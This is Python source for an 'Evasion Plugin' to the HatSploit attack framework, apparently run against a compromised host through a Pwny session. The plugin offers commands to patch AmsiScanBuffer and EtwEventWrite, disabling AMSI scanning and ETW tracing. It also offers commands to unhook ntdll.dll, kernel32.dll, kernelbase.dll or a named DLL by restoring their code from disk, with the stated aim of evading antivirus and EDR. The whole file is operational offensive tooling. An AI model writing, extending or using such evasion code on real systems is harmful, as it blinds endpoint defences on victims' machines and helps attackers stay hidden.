"""
This plugin requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from badges.cmd import Command

from pwny.api import *
from pwny.types import *

from hatsploit.lib.core.plugin import Plugin


EVASION_PATCH_AMSI = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL)
EVASION_PATCH_ETW = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL + 1)
EVASION_PATCH_ALL = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL + 2)
EVASION_UNHOOK_NTDLL = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL + 3)
EVASION_UNHOOK_DLL = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL + 4)

TLV_TYPE_UNHOOK_DLL = tlv_custom_type(TLV_TYPE_STRING, TAB_BASE, API_TYPE)
TLV_TYPE_UNHOOK_BYTES = tlv_custom_type(TLV_TYPE_INT, TAB_BASE, API_TYPE)


class HatSploitPlugin(Plugin):
    def __init__(self):
        super().__init__({
            'Name': "Evasion Plugin",
            'Plugin': "evasion",
            'Authors': [
                'EntySec - plugin developer',
            ],
            'Description': (
                "Patch AMSI/ETW and unhook DLLs to evade AV and EDR."
            ),
        })

        self.commands = [
            Command({
                'Category': "evasion",
                'Name': "evasion",
                'Description': "Patch AMSI/ETW to evade AV and EDR.",
                'MinArgs': 1,
                'Options': [
                    (
                        ('-a', '--amsi'),
                        {
                            'help': "Patch AmsiScanBuffer to disable AMSI.",
                            'action': 'store_true',
                        }
                    ),
                    (
                        ('-e', '--etw'),
                        {
                            'help': "Patch EtwEventWrite to disable ETW tracing.",
                            'action': 'store_true',
                        }
                    ),
                    (
                        ('-A', '--all'),
                        {
                            'help': "Patch both AMSI and ETW.",
                            'action': 'store_true',
                        }
                    ),
                ]
            }),
            Command({
                'Category': "evasion",
                'Name': "unhook",
                'Description': "Remove userland API hooks from DLLs.",
                'MinArgs': 1,
                'Options': [
                    (
                        ('-n', '--ntdll'),
                        {
                            'help': "Unhook ntdll.dll (most common target).",
                            'action': 'store_true',
                        }
                    ),
                    (
                        ('-a', '--all'),
                        {
                            'help': (
                                "Unhook ntdll.dll, kernel32.dll, "
                                "and kernelbase.dll."
                            ),
                            'action': 'store_true',
                        }
                    ),
                    (
                        ('-d', '--dll'),
                        {
                            'help': "Unhook a specific DLL by name.",
                            'metavar': 'NAME',
                        }
                    ),
                ]
            }),
        ]

    def evasion(self, args):
        if args.all:
            self.print_process("Patching AMSI and ETW...")

            result = self.session.send_command(
                tag=EVASION_PATCH_ALL, plugin=self.plugin
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error("Failed to patch AMSI/ETW!")
                return

            self.print_success("AMSI and ETW patched successfully.")
            return

        if args.amsi:
            self.print_process("Patching AmsiScanBuffer...")

            result = self.session.send_command(
                tag=EVASION_PATCH_AMSI, plugin=self.plugin
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error(
                    "Failed to patch AMSI! "
                    "amsi.dll may not be loaded in current process."
                )
                return

            self.print_success("AMSI patched — AmsiScanBuffer neutralized.")

        if args.etw:
            self.print_process("Patching EtwEventWrite...")

            result = self.session.send_command(
                tag=EVASION_PATCH_ETW, plugin=self.plugin
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error("Failed to patch ETW!")
                return

            self.print_success("ETW patched — EtwEventWrite neutralized.")

        if not args.amsi and not args.etw:
            self.print_usage()

    def _unhook_one(self, dll_name):
        """Unhook a single DLL and report result."""
        if dll_name.lower() == 'ntdll.dll':
            result = self.session.send_command(
                tag=EVASION_UNHOOK_NTDLL, plugin=self.plugin
            )
        else:
            result = self.session.send_command(
                tag=EVASION_UNHOOK_DLL, plugin=self.plugin,
                args={TLV_TYPE_UNHOOK_DLL: dll_name},
            )

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error(f"Failed to unhook {dll_name}!")
            return False

        nbytes = result.get_int(TLV_TYPE_UNHOOK_BYTES)
        self.print_success(
            f"Unhooked {dll_name} — restored {nbytes} bytes of .text"
        )
        return True

    def unhook(self, args):
        if args.ntdll:
            self.print_process("Restoring ntdll.dll from disk...")
            self._unhook_one("ntdll.dll")

        elif args.all:
            self.print_process(
                "Restoring ntdll.dll, kernel32.dll, kernelbase.dll..."
            )
            for dll in ("ntdll.dll", "kernel32.dll", "kernelbase.dll"):
                self._unhook_one(dll)

        elif args.dll:
            self.print_process(f"Restoring {args.dll} from disk...")
            self._unhook_one(args.dll)

    def load(self):
        pass
